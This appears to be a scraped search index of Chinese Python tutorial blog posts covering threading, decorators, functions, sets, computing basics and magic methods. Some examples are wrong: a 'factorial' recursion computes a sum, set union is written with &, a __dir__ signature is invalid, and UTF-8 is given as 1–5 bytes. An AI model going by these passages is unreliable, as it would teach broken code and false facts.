程序退出时，如果还有非守护线程在运行，程序会等待所有非守护线程运行完毕才会退出（默认创建的就是非守护线程）。 常用方法：\nstart() -\u0026gt; None：开始线程 run() -\u0026gt; None：线程活动的方法 join(timeout: Optional[float] = ...) -\u0026gt; None：阻塞主线程，直到线程结束（timeout 参数可以设置阻塞时间） getName() -\u0026gt; str：得到线程名字 setName(name: str) -\u0026gt; None：设置线程名字 is_alive() -\u0026gt; bool：判断线程是否存活 isAlive() -\u0026gt; bool：判断线程是否存货 isDaemon() -\u0026gt; bool：判断线程是否是守护线程 setDaemon(daemonic: bool) -\u0026gt; None：设置线程为守护线程（必须在start()方法之前执行） 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 import threading def say(name, num): for i in range(num): print(name, \u0026#39;:\u0026#39;, i) if __name__ == \u0026#39;__main__\u0026#39;: t1 = threading.Thread(target=say, args=(\u0026#39;t1\u0026#39;, 10)) t2 = threading.Thread(target=say, args=(\u0026#39;t2\u0026#39;, 50), daemon=True) t1.start() t2.start() t1.join() 3. 锁（Lock、RLock） 在多线程中，当数据在不同的线程中同时进行读写时，就会因为线程间速度不匹配而导致数据紊乱。此时就需要加锁来保证数据的一致性。 Lock类返回一个（只能单次加锁）原始锁 对象，RLock类返回一个（可以重复加锁）递归锁对象。锁支持上下文管理器。 常用方法：\nacquire(blocking: bool, timeout: float) -\u0026gt; bool：如果成功获得锁，则返回 True，否则返回 False (例如发生 超时 的时候)。（参数 blocking为 True（默认值），阻塞直到锁被释放，然后将锁锁定并返回 True ； 当blocking为 False 时，锁不会发生阻塞。如果调用时 blocking 设为 True 会阻塞，并立即返回 False ；否则，将锁锁定并返回 True。timeout 可以设置阻塞时间。当 blocking 为 false 时，timeout 指定的值将被忽略） release() -\u0026gt; None：释放锁（这个方法可以在任何线程中调用） locked() -\u0026gt; bool：判断是否获得锁 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import threading def say(name, lock): lock.acquire() print(name) lock.release() if __name__ == \u0026#39;__main__\u0026#39;: lock = threading.Lock() t1 = threading.Thread(target=say, args=(\u0026#39;t1\u0026#39;, lock)) t2 = threading.Thread(target=say, args=(\u0026#39;t2\u0026#39;, lock), daemon=True) t1.start() t2.start() t1.join() 4. 条件对象（Condition） 当我们需要等到特定条件才释放锁时，这个时候就试用于条件对象。 条件变量总是与某种类型的锁对象相关联，锁对象可以通过传入获得，或者在缺省的情况下自动创建。 参数：\nlock: Union[Lock, _RLock, None]：传入一个锁，默认会自动生成一个锁。 常用方法：\nacquire(blocking: bool, timeout: float) -\u0026gt; bool：与锁对象的该方法相同 release() -\u0026gt; None：与锁对象的该方法相同 wait(timeout: Optional[float]) -\u0026gt; bool：等待直到被通知或发生超时（timeout为超时参数） wait_for(predicate: Callable[[], _T], timeout: Optional[float]) -\u0026gt; _T：等待，直到条件计算为真（predicate 一个可调用对象并且其返回值可被解释为一个布尔值； timeout 参数给出最大等待时间） notify(n: int) -\u0026gt; None：默认唤醒一个等待这个条件的线程（n可以设置最多唤醒的线程数，默认为1） notify_all() -\u0026gt; None：唤醒所有等待的线程 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import threading def say(con): con.acquire() for _ in range(5): print(\u0026#39;say\u0026#39;) con.notify() con.wait() def listen(con): con.acquire() for _ in range(5): print(\u0026#39;listen\u0026#39;) con.release() if __name__ == \u0026#39;__main__\u0026#39;: con = threading.Condition() t1 = threading.Thread(target=say, args=(con, ), daemon=True) t2 = threading.Thread(target=listen, args=(con, )) t1.start() t2.start() t2.join() 5. 信号量（Semaphore） 一个信号量管理一个内部计数器，该计数器因 acquire() 方法的调用而递减，因 release() 方法的调用而递增。 计数器的值永远不会小于零；当 acquire() 方法发现计数器为零时，将会阻塞，直到其它线程调用 release() 方法。 参数： value: int：设置最多引用的锁的数量\n常用方法：\nacquire(blocking: bool, timeout: float) -\u0026gt; bool：加锁，计数器减1 release() -\u0026gt; None：释放锁，计数器加1 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import threading import time def say(name, se): se.acquire() print(name) time.sleep(1) se.release() if __name__ == \u0026#39;__main__\u0026#39;: se = threading.Semaphore(3) for i in range(10): t = threading.Thread(target=say, args=(i, se)) t.start() 6. 事件对象（Event） 实现事件对象的类。 事件对象管理一个内部标志，调用 set() 方法可将其设置为True。调用 clear() 方法可将其设置为False。调用 wait() 方法将进入阻塞直到标志为True（标志初始时为False）。 常用方法：\nis_set() -\u0026gt; bool：返回内部标志 set() -\u0026gt; None：将内部标志设置为True clear() -\u0026gt; None：将内部标志设置为False wait(timeout: Optional[float]) -\u0026gt; bool：阻塞线程直到内部变量为True（timeout可设置超时参数） 例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import threading def say1(eve): if eve.wait(): print(\u0026#39;小鸡炖蘑菇\u0026#39;) def say2(eve): print(\u0026#39;天王盖地虎\u0026#39;) eve.set() if __name__ == \u0026#39;__main__\u0026#39;: eve = threading.Event() t1 = threading.Thread(target=say1, args=(eve, )) t2 = threading.Thread(target=say2, args=(eve,)) t1.start() t2.start() 7. 定时器对象（Timer） 此类表示一个操作应该在等待一定的时间之后运行——相当于一个定时器（Timer类继承自Thread类）。 参数：\ninterval: float：等待时间 function: Callable[..., None]：可调用对象，即在等待完成后需要执行的任务 args: Optional[Iterable[Any]]：传递给可调用对象的参数 kwargs: Optional[Mapping[str, Any]]：传递给可调用对象的关键字参数 常用方法： cancel() -\u0026gt; None：取消定时器\n例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import threading def say1(): print(\u0026#39;小鸡炖蘑菇\u0026#39;) def say2(): print(\u0026#39;天王盖地虎\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: t1 = threading.Thread(target=say2) t2 = threading.Timer(1, say1) t1.start() t2.start() ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%A4%9A%E7%BA%BF%E7%A8%8B/","title":"Python学习之路——多线程"},{"content":"Python 学习之路——高阶函数 Python语言中，一切皆对象。函数本身也是一个对象，我们知道函数的参数可以传递任意对象，函数的返回值也可以返回任意对象，那么在Python中函数能不能传递或者返回一个函数呢？答案是当然可以，我们把这种传参为函数或者返回值为函数对象的函数称为高阶函数。\n一、递归函数 定义：在计算过程中，如果其中后一步都要用到前一步的结果，称为递归的。调用自身的函数称之为递归函数。 递归式函数有两个条件 1.**基线条件：**问题可以被分解为最小的问题，当满足基线条件的时候，递归就不在执行了。 2.**递归条件：**将问题可以分解的条件。 例题：计算100的阶乘结果。\n1 2 3 4 5 6 def fn(n): if n == 1: # 基线条件 return 1 else: # 递归条件 return n + fn(n-1) print(fn(100)) # 5050 二、匿名函数 对于一些功能简单，使用次数不多的函数，我们可以将它定义为匿名函数，来节省内存空间提高代码效率。lambda函数表达式就是用来创建匿名函数的。 语法格式：lambda 参数列表 : 返回值\n1 2 x = lambda i:i+1 print(x(5)) # 6 三、函数闭包 当我们有一些函数或者数据，不希望用户知道或者修改的时候，我们就需要对函数或者内部数据进行闭包处理。通过闭包可以创建一些只有当前函数才能访问的对象，还可以将一些私有的数据藏到闭包中。 形成闭包的条件:\n函数嵌套 将内部函数作为返回值返回 内部函数必须使用到外部函数的变量 1 2 3 4 5 6 def fn(): def fn1(a):\t# fn1函数就是我们想要隐藏的函数 print(a) return fn1 a = fn() a(\u0026#34;Python\u0026#34;) # Python 四、装饰器 在了解装饰器之前，我们先了解一个软件设计模式的开闭原则（OCP）： OCP全称Open Closed Principle。一个软件实体的模块和函数应该对扩展开放，对修改关闭。 遵守开闭原则可以极大提高提高系统的可维护性和代码的重用性。 为了既不对原有的函数进行修改，又想要拓展原有函数的功能，我们可以通过一个新的函数来拓展原有函数的功能。这个新的函数就叫装饰器函数。 原则：拓展函数或类的功能，但不影响原来的调用\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 def fn1():\t# 原函数 sum = 0 for i in range(10): sum += i print(sum) def fn2(old):\t# 装饰器函数 def fn3(*args,**kwargs): print(\u0026#34;开始执行函数...\u0026#34;) old() print(\u0026#34;函数执行完毕！\u0026#34;) return fn3 fn2(fn1)() # 开始执行函数... # 45 # 函数执行完毕！ 装饰器语法糖 为了使装饰器变得更加美观，Python中加入了语法糖，语法糖使程序变得更加整洁美观。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def fn2(old): def fn3(*args,**kwargs): print(\u0026#34;开始执行函数...\u0026#34;) old() print(\u0026#34;函数执行完毕！\u0026#34;) return fn3 @fn2 def fn1(): sum = 0 for i in range(10): sum += i print(sum) fn1() # 开始执行函数... # 45 # 函数执行完毕！ 1. 函数装饰器 函数装饰器即以函数作为装饰器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def fn2(old): def fn3(*args,**kwargs): print(\u0026#34;开始执行函数...\u0026#34;) old() print(\u0026#34;函数执行完毕！\u0026#34;) return fn3 @fn2 def fn1(): sum = 0 for i in range(10): sum += i print(sum) fn1() # 开始执行函数... # 45 # 函数执行完毕！ 2. 类装饰器 类装饰器即以类作为装饰器。 想要以类作为装饰器，则必须要在内中实现**__call__魔法方法和__init__魔法方法**。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class User(object): def __call__(self, *args, **kwargs): print(\u0026#39;Start function...\u0026#39;) self._fun(*args, **kwargs) print(\u0026#39;Function end...\u0026#39;) def __init__(self, fun): self._fun = fun @User def fun(*args, **kwargs): print(*args, **kwargs) fun(\u0026#39;Python\u0026#39;) \u0026#39;\u0026#39;\u0026#39; Start function... Python Function end... \u0026#39;\u0026#39;\u0026#39; ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/","title":"Python学习之路——高阶函数"},{"content":"Python 学习之路——函数 函数是组织好的，可重复使用的，用来实现单一，或相关联功能的代码段。函数能提高应用的模块性和代码的重复利用率。函数也是一个对象！\n一、创建函数 函数的语法：\n1 2 def 函数名([形参1,形参2,形参3...]): # 代码块（代码块不能为空） 例子：\n1 2 3 # 例如： def fn(): print(\u0026#39;Python\u0026#39;) 上面的这个例子就是一个函数，这个函数的功能就是打印字符串 \u0026lsquo;Python\u0026rsquo; 。其中需要注意的是，fn() 为调用函数，而 fn 是函数对象。\n1 2 3 4 5 fn() # \u0026#39;Python\u0026#39; print(fn) # \u0026lt;function fn at 0x00000294319D22F0\u0026gt; # 解读：fn是一个function(函数)对象，他在内存中的地址为0x00000294319D22F0 二、函数的参数 函数传递的参数可以是任意对象，函数的参数分为形参和实参。 定义： 形参(形式参数)：定义形参就是相当于在函数内部定义了变量，但是并没有赋值 实参(实际参数)：函数定义时指定了形参，那么调用函数的时候也必须传递实参 形参就是定义函数时使用，实参就是调用函数时使用，参数用逗号隔开。\n1. 位置参数 在定义函数的时候，可以在函数名后面的括号里面定义数量不等的位置参数。\n1 2 3 4 # 定义fn()时写的的a, b就是该函数的两个位置参数 def fn(a, b): print(a + b) fn(1, 2) # 3 2. 关键字参数 关键字传参可以不按照形参定义的顺序去传参，而根据参数名来传递参数。关键字参数定义式需要有一个初始值。\n1 2 3 4 5 def fn(a = 1, b = 2): #a, b就是两个关键字参数 print(a + b) fn() # 3 fn(a = 3, b = 4) # 调用函数时可以传递关键字参数 # 7 位置参数和关键字参数可以混合使用，混合使用的时候位置参数必须在关键字参数前面：\n1 2 3 def fn(a, b = 2): #a是位置参数b是关键字参数 print(a + b) fn(1) # 3 3. 不定长参数 在定义函数的时候，如果函数需要传入位置参数较多，可以在位置参数的前面加上一个 * ，这样这个形参将会获取到所有的位置参数，以元组形式保存。\n1 2 3 def fn(*a): print(a) fn(1,2,3) # (1,2,3) 当关键字参数较多时也可以使用不定长参数，在参数前面加上 **，那么这个参数就是一个保存所有关键字的不定长参数，以字典形式保存。\n1 2 3 def fn(**a): print(a) fn(a = 1, b = 2,c = 3) # {\u0026#39;a\u0026#39; = 1, \u0026#39;b\u0026#39; = 2, \u0026#39;c\u0026#39; = 3} 4. 参数的解包 当调用函数时需要传递的参数较多，可以将需要传递的参数先打包，在调用时进行解包。\n1 2 3 4 5 6 def fn(a,b,c): print(\u0026#39;a =\u0026#39;, a) print(\u0026#39;b =\u0026#39;, b) print(\u0026#39;c =\u0026#39;, c) d = {\u0026#39;a\u0026#39;:100,\u0026#39;b\u0026#39;:200,\u0026#39;c\u0026#39;:300} fn(**d) 三、函数的返回值 返回值就是函数执行以后返回的执行结果，一个函数可以有返回值也可以没有返回值，可以有一个返回值也可以有多个返回值。Python语言中用return来指定函数的返回值，return后面可以跟任意对象。函数执行完return语句后就结束调用，return后的语句不再执行。\n1 2 3 4 5 6 7 8 # 计算传递的参数的和并返回 def fn(*args): result = 0 for i in args: result += i return result print(\u0026#34;End!\u0026#34;) # 该条语句不会执行 res = fn(1,2,3) # res = 6 当函数只写一个return或者不写return时，函数返回值为None。\n1 2 3 def fn(a): print(a) res = fn(1) # res = None 四、函数文档注释 当我们在编写程序时，为了让使用者更好的了解我们这个函数的功能，我们可以编写函数文档注释，对这个函数做一个使用说明。同样我们在使用别人的程序时也可以通过查看文档注释来了解函数。\n1 2 3 4 5 6 7 8 9 10 def fn(): \u0026#34;\u0026#34;\u0026#34; 打印字符串\u0026#39;Python\u0026#39; :return: None \u0026#34;\u0026#34;\u0026#34; print(\u0026#39;Python\u0026#39;) help(fn) # fn() # 打印字符串\u0026#39;Python\u0026#39; # :return: None 五、函数作用域 作用域指的就是变量生效的区域。 全局作用域： 全局作用域在程序执行时创建，在程序执行结束时销毁，所有函数以外的部分都是全局作用域，在全局作用域中定义的变量，都属于全局变量，全局变量可以在程序的任意位置访问。 函数作用域： 函数作用域在函数调用时创建，在调用结束后销毁，函数每调用一次就会产生一个新的作用域，在函数作用域中定义的变量都是局部变量，它只能在函数内部被访问到。\n1 2 3 4 5 6 a = 10 # a就是全局变量 def fn(): b = 20 # b就是局部变量 print(a, b) # 10,20 fn() print(b) # 由于b是局部变量，在函数外部不能访问 如果希望在函数定义域中定义全局变量，可以添加global关键字:\n1 2 3 4 5 6 7 a = 10 # a就是全局变量 def fn(): global b b = 20 # b就是局部变量 print(a, b) # 10,20 fn() print(b) # 20 六、命名空间 命名空间实际上就是一个字典，专门用来储存该作用域变量的字典。 locals()函数用来获取当前作用域的命名空间。\n1 2 3 4 a = 10 print(locals()) # {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x00000182308D60B8\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;Python.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;a\u0026#39;: 10} # 可以通过当前命名空间看到定义在全局定义域的a变量 向当前命名空间中添加键值对，可以定义一个位于当前作用域的变量。\n1 2 3 a = locals() a[\u0026#39;b\u0026#39;] = 10 print(b) # 10 globals()函数可以用来在任意位置获取全局命名空间。\n1 2 3 4 5 def fn(): a = globals() print(a) fn() # {\u0026#39;__name__\u0026#39;: \u0026#39;__main__\u0026#39;, \u0026#39;__doc__\u0026#39;: None, \u0026#39;__package__\u0026#39;: None, \u0026#39;__loader__\u0026#39;: \u0026lt;_frozen_importlib_external.SourceFileLoader object at 0x000002758A9760B8\u0026gt;, \u0026#39;__spec__\u0026#39;: None, \u0026#39;__annotations__\u0026#39;: {}, \u0026#39;__builtins__\u0026#39;: \u0026lt;module \u0026#39;builtins\u0026#39; (built-in)\u0026gt;, \u0026#39;__file__\u0026#39;: \u0026#39;Python.py\u0026#39;, \u0026#39;__cached__\u0026#39;: None, \u0026#39;a\u0026#39;: 10, \u0026#39;fn\u0026#39;: \u0026lt;function fn at 0x000002758AC622F0\u0026gt;} ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%87%BD%E6%95%B0/","title":"Python学习之路——函数"},{"content":"Python 学习之路——集合(set) 集合是Python里一个无序的不重复元素序列。\n一、创建集合 集合和列表基本一致，但是集合具有以下几个特点： 1.集合只能存储不可变对象 2.集合中存储的对象是无序的 3.集合中不能出现重复的元素\n1 2 3 4 5 6 # 方式一 set1 = {\u0026#39;set\u0026#39;} # 方式二 set2 = set() # 创建一个空字典 # set()函数中可以传递一个可迭代对象 set3 = set(\u0026#39;set\u0026#39;) # ser3 = {\u0026#39;s\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;t\u0026#39;} 二、访问集合的值 1. 通过索引访问 集合作为一种无序的序列，是不能够通过索引直接访问的，要想通过索引访问，只能先将它转化为其他有序序列，如元组和列表。并且由于集合是无序的，通过索引访问的时候也并非是按照存入的顺序。\n1 2 3 set1 = {\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;} print(list(set1)[0]) print(tuple(set1)[0]) 2. 遍历集合 集合作为一种无序的序列，虽然不能通过索引访问，但是作为一种序列，依然可以使用for语句进行遍历。注意：遍历结果也是无序的。\n1 2 3 set1 = {\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;} for i in set1: print(i) 三、集合的特殊操作 1. 判断元素是否在集合内部 1 2 3 set1 = {\u0026#39;P\u0026#39;, \u0026#39;y\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;h\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;n\u0026#39;} \u0026#39;P\u0026#39; in set1 # True \u0026#39;P\u0026#39; not in set1 # False 2. 集合的运算 假设有集合A和集合B：\n(1) 交集 找集合A和和集合B中共有的元素就是求A和B的交集。\n1 2 3 set1 = {1,2,3,4,5} set2 = {3,4,5,6,7} set3 = set1 \u0026amp; set2 # set3 = {3, 4, 5} (2) 并集 找集合A和和集合B中所有的元素就是求A和B的交集。\n1 2 3 set1 = {1,2,3,4,5} set2 = {3,4,5,6,7} set3 = set1 \u0026amp; set2 # set3 = {1, 2, 3, 4, 5, 6, 7} (3) 差集 所有属于A且不属于B的元素的集合被称为A与B的差集。\n1 2 3 set1 = {1,2,3,4,5} set2 = {3,4,5,6,7} set3 = set1 - set2 # set3 = {1, 2} (4) 异或集 集合A和集合B中除去相同元素后剩下的元素的集合叫做A和B的异或集。\n1 2 3 set1 = {1,2,3,4,5} set2 = {3,4,5,6,7} set3 = set1 ^ set2 # set3 = {{1, 2, 6, 7} (5) 子集与真子集 如果集合A中包含有集合B的所有元素且含有集合B没有的元素，那么集合B就是集合A的真子集。如果集合A和集合B中元素相同，就是子集。空集是任意非空集合的真子集。\n1 2 3 4 set1 = {3,4,5} set2 = {3,4,5,6,7} set1 \u0026lt; set2 # True set1 \u0026lt;= set2 # True (6) 超集与真超集 集合A中的每一个元素都在集合B中，且集合A中可能包含B中没有的元素，则集合A就是B的一个超集，反过来，B是A的子集。 A是B的超集，若A中一定有B中没有的元素，则A是B的真超集，反过来B是A的真子集。\n1 2 3 4 set1 = {3,4,5} set2 = {3,4,5,6,7} set2 \u0026gt; set1 # True set2 \u0026gt;= set1 # True 四、集合常用函数 1. 求取集合中元素个数 1 2 3 4 5 set1 = {1,2,3,4,5} # len()函数可以用来求取集合中元素个数 len(set1) # 5 # 魔术方法 面向对象 set1.__len__() # 5 2. 删除集合 1 2 3 4 5 set1 = {1,2,3,4,5} # del()函数可以删除整个集合并回收地址 del set1 # 因为set1已经被回收了，所以调用时会报错 print(set1) # NameError: name \u0026#39;set1\u0026#39; is not defined 五、集合常用方法 1. 添加元素(add) 1 2 3 set1 = {1,2,3,4,5} # add()方法可以向集合中添加元素 set1.add(6) # set1 = {1,2,3,4,5,6} 2. 清空集合(clear) 1 2 3 set1 = {1,2,3,4,5} # clear()方法可以清空集合 set1.clear() # set1 = {} 3. 随机删除集合中的元素(pop) 1 2 3 set1 = {1,2,3,4,5} # pop()方法会随机删除集合中一个元素并返回删除的元素 set1.pop() 4. 删除集合中的指定元素(remove) 1 2 3 4 5 set1 = {1,2,3,4,5} # remove()方法会删除集合指定元素 set1.remove(5) # set1 = {1,2,3,4} # 当删除元素不在集合中时会抛出异常 set1.remove(6) # KeyError: 6 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E9%9B%86%E5%90%88set/","title":"Python学习之路——集合（set）"},{"content":"Python 学习之路——计算机基础知识 一、计算机的概念 1.什么是计算机？ 1946年2月14日人类历史上第一台真正意义上的计算机问世。计算机到了今天已经成为人们日常生活中离不开的一个重要组成部分。计算机俗称电脑，是现代一种用于高速计算的电子计算机器，它可以进行数值计算，也可以进行逻辑计算，并且还具备存储记忆功能。\n2.计算机的组成 计算机是由硬件和软件结合而成的强大工具： 硬件：键盘，鼠标，硬盘，CPU等实际物体； 软件：程序，操作系统等，这些都是按照特定顺序组织的计算机的数据和特定指令的集合。\n二、计算机语言 1.计算机语言分类 计算机语言分为：机器语言，汇编语言，高级计算机语言三大类。 机器语言：由0和1组成的二进制编码； 汇编语言：用助记符代替机器指令，用地址符号或标号代替指令或操作数的地址。因此也被称为符号语言； 高级语言：将机器语言和汇编语言集成为人类容易看懂的模块，方便进行开发的语言，例如C/C++，JAVA，Python等。\n2.高级语言 根据转化时间的不同，高级语言又分为编译性语言和解释性语言： 编译性语言：源代码先编译生成机器语言，再由机器运行机器码。例如：C/C++等。 解释性语言：源代码不进行预先编译，以文本方式存储，在运行程序的时候，解释性语言先解释再运行。例如：Python，JAVA等。 优缺点比较： 编译性语言由于会预先转化为机器码，所以速度较快，但是跨平台型不好。 解释性语言由于是运行时才对程序进行解释，而且每运行一次就要解释一次，所以速度相对于编译性语言速度较慢，但是其跨平台型良好。\n三、计算机交互方式 1.命令行文本（Text-based User Interface） 命令行一般指命令提示符。命令提示符是在操作系统中，提示进行命令输入的一种工作提示符。在不同的操作系统环境下，命令提示符各不相同。 2.图形界面化（Graphical User Interface） 图形用户界面指采用图形方式显示的计算机操作用户界面。 3.常用Dos命令 （Dos命令指DOS操作系统的命令，是一种面向磁盘的操作命令，主要包括目录操作类命令、磁盘操作类命令、文件操作类命令和其它命令） 1 dir 列出文件或文件夹 2 md 创建目录 3 rd 删除目录 4 cd 进入指定目录 5 cd.. 返回上一级目录 6 cd/ 退回根目录 7 del 删除文件\n四、文本文件和字符集 1.文本文件 文本文件分为纯文本文件和富文本文件： 纯文本：只能保存单一的内容；（开发中只使用纯文本） 富文本：可以保存文本以外的内容，例如图片等。（例如Word）\n2.字符集 编码和解码时所采用的规则我们称之为字符集。 编码：将字符转换成二进制； 解码：将二进制转换为字符。\n3.常见字符集 ASCII码表：美国人的编码表，使用7位二进制来对美国常用的字符进行编码，包含128个字符 ISO-8859-1表：欧洲人使用的编码表，使用8位二进制来对美国常用的字符进行编码，包含256个字符 GBK码：中国人使用的编码表，利用双字节编码方式（一个汉字占两个Byte），编码范围从8140至FEFE（剔除xx7F），包含23940个码位，总共收录了21003个汉字 Unicode：俗称万国码，其包含世界上所有的语言和符号。Unicode编码分为多种实现方式：utf-8，utf-16，utf-32。最常用的就是utf-8。utf-8范围1 - 5字节，utf - 16范围2 - 4个字节，utf - 32范围4个字节\n五、进制转换 1.进制分类 十进制：日常生活中最常用进制，用数字09计数，满十进一； 二进制：机器使用的语言，用数字0和1计数，满二进一； 八进制：利用三位二进制编码进行存储，用数字07计数，满八进一； 十六进制：利用四位二进制编码进行存储，用数字09和字母af进行计数，满十六进一。\n2.数据间的转换 内存当中每一个小格子我们称为1bit(位)，bit是计算机中最小的单位，byte是我们可以操作的最小的单位 常见数据单位转换： 8bit = 1byte(字节) 1024byte = 1kb(千字节) 1024kb = 1mb(兆字节) 1024mb = 1gb(吉字节) 1024gb = 1tb(太字节)\n六、环境变量 1.系统环境变量 系统环境变量指操作系统中的一些变量（以下方法是针对Windows系统而言的） a）查看环境变量 右键计算机属性 左侧选择高级系统配置 选择环境变量 环境变量 分为2个部分 上面是 用户变量 下面是系统变量 b）添加环境变量 通过新建按钮添加环境变量 一个环境变量可以有多个值，值与值之间用 英文的分号隔开(;) c）修改环境变量 通过编辑按钮来修改环境变量 d）删除环境变量 通过删除按钮来删除环境变量\n2.path环境变量 path环境变量中保存的是一个一个的路径。 我们在给操作系统下达一个命令时，系统会在当前目录下寻找，如果当前位置存在就直接打开或者执行；如果就去path环境变量的路径中去依次寻找，直到找到为止；如果path环境变量中也没有找到该路径，则报错。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/python%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"Python学习之路——计算机基础知识"},{"content":"Python 学习之路——类的魔法方法 前言 类作为Python中最核心的部分，我们作为作为开发人员不仅仅可以为类自定义方法，在Python内部也为我们提供了众多魔法方法来帮助我们完善类的功能。\n一、基本方法 1. __init_subclass__（创建类） 当创建一个类时，它会自动执行父类的该魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Parent(object): def __init_subclass__(cls, **kwargs): # kwargs获取的是子类创建时所传递的额外参数 print(\u0026#34;Parent class executing\u0026#34;) print(f\u0026#34;__init_subclass__({cls}, {kwargs})\u0026#34;) for k, v in kwargs.items(): type.__setattr__(cls, k, v) # 为类设置属性 class Subclass(Parent, name=\u0026#39;Python\u0026#39;): pass print(Subclass.name) \u0026#34;\u0026#34;\u0026#34; Parent class executing __init_subclass__(\u0026lt;class \u0026#39;__main__.Subclass\u0026#39;\u0026gt;, {\u0026#39;name\u0026#39;: \u0026#39;Python\u0026#39;}) Python \u0026#34;\u0026#34;\u0026#34; 2. __new__（创建实例对象） 该方法在创建一个实例对象时调用，用来创建实例对象和为对象分配空间。该方法时继承至object类的静态方法。该方法的调用在 init 方法之前。\n1 2 3 4 5 6 7 8 9 10 11 12 class Demo(object): def __init__(self, name): self.name = name def __new__(cls, *args, **kwargs): print(f\u0026#39;__new__(cls, *{args}, **{kwargs})\u0026#39;) return super().__new__(cls) # 返回一个实例对象 a = Demo(\u0026#39;Python\u0026#39;) print(a.name) # Python 3. __init__（初始化实例对象） 该方法在类实例化时会自动调用。用来为实例对象进行初始化操作。\n1 2 3 4 5 6 7 8 class Demo(object): def __init__(self, name): self.name = name a = Demo(\u0026#39;Python\u0026#39;) print(a.name) # Python 4. __hash__（hash()） 该方法会由内置函数hash（）调用，用于对哈希集合（包括set，frozenset和dict）的成员执行操作。\n1 2 3 4 5 6 7 8 9 10 11 class Demo(object): def __init__(self, name): self.name = name def __hash__(self): return 1 a = Demo(\u0026#39;Python\u0026#39;) print(hash(a)) # 1 5. __dir__（dir()） 调用 dir() 函数时，会自动调用该魔法方法。在object类中，该方法会返回实例的属性与方法名。该方法的返回值必须是一个可迭代对象。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Demo(object): def __init__(self): self.name = \u0026#39;demo\u0026#39; def __dir__(self) -\u0026gt; Iterable[str](self): return \u0026#39;ABCD\u0026#39; a = Demo() print(dir(a)) # [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;, \u0026#39;D\u0026#39;] \u0026#34;\u0026#34;\u0026#34; 默认输出格式： [\u0026#39;__class__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, \u0026#39;__ge__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__weakref__\u0026#39;, \u0026#39;name\u0026#39;] \u0026#34;\u0026#34;\u0026#34; 6. __sizeof__（分配空间大小） 用以返回对象系统分配空间的大小。\n1 2 3 4 5 6 class Demo(object): pass a = Demo() print(a.__sizeof__()) 7. __format__（format()） 我们知道在字符串的内置方法中有一个fomat()方法，它可以添加任意对象到字符串。当使用str.format()方法或者使用format()函数时，调用的就是这个魔法方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Demo(object): def __init__(self): self.name = \u0026#39;demo\u0026#39; def __format__(self, format_spec): # format_spec 指的是格式规范，默认为空 return self.name a = Demo() print(format(a)) # Return value.__format__(format_spec) # demo 